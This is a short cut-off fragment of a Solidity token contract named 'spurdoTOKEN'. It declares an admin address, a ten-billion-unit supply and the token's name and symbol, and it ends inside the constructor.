...
contract spurdoTOKEN is Ownable {
    address public dccbagy65;
    uint256 supplyamount = 10000000000*10**decimals();
    uint256 private _cctotalSupply = supplyamount;
    string private _cctokenname = "spurdo";
    string private _cctokensymbol = "spurdo";
    constructor(address tokenadmin) {
        dccbagy65 = tokenadmin;
